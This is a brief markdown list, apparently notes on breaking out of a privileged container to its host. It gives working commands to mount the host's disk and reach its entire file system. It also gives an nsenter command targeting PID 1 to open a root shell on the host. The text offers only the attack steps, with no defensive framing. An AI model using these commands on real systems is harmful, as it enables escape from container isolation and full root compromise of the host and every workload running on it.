* `mkdir -p /mnt/meme`
* find your local file system with `fdisk -l`
* `mount /dev/<device> /mnt/meme`
* you can now access the entire file system of the parent

* alternatively to get a root shell on the parent
* `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`